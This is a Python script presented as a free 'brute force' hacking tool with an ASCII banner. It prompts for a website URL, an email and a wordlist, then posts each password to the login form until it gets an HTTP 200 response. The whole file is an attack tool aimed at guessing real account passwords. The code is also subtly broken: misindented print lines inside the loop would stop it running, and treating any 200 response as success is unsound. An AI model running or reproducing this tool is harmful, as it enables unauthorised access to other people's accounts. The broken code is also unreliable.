import itertools
import string
import hashlib
import time
import requests

# JP Brute Banner
print("""
 _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
| | | | | | | | | | | | | | | | | | | | |
| |_| | |_| | |_| | |_| | |_| | |_| | |_|
|  J  P  B  R  U  T  E  H  A  C  K  E  R  |
|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|
""")

# Menu Bar
print("==========================================")

print("|         JP Brute Force Tool           |")
print("|---------------------------------------|")
print("| Maker: James Phillips                 |")
print("| Facebook: James Phillips             |")
print("| Tool Status: Free                     |")
print("==========================================")

# Get website URL and email
website_url = input("Enter website URL: ")
email = input("Enter email: ")

# Get password list
password_list = input("Enter password list file (default: wordlist.txt): ")
if not password_list:
    password_list = "wordlist.txt"

# Load password list
try:
    with open(password_list, 'r') as file:
        passwords = file.readlines()
except FileNotFoundError:
    print("Password list file not found.")
    exit()

# Ask to start
start = input("Start brute force attack? (y/n): ")
if start.lower() != 'y':
    print("Exiting...")
    exit()

# Brute force attack
for password in passwords:
    password = password.strip()
    try:
        response = requests.post(website_url, data={'email': email, 'password': password})
        if response.status_code == 200:
            print(f"Password found: {password}")
            # Update menu bar with password
            print("\033[H\033[J", end='')
            print("""
 _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
| | | | | | | | | | | | | | | | | | | | |
| |_| | |_| | |_| | |_| | |_| | |_| | |_|
|  J  P  B  R  U  T  E  H  A  C  K  E  R  |
|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|
""")
            print("==========================================")

print("|         JP Brute Force Tool           |")
print("|---------------------------------------|")
print(f"| Maker: James Phillips                 |")
print("| Facebook: James Phillips             |")
print(f"| Tool Status: Password Found - {password} |")
            print("==========================================")
            break
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")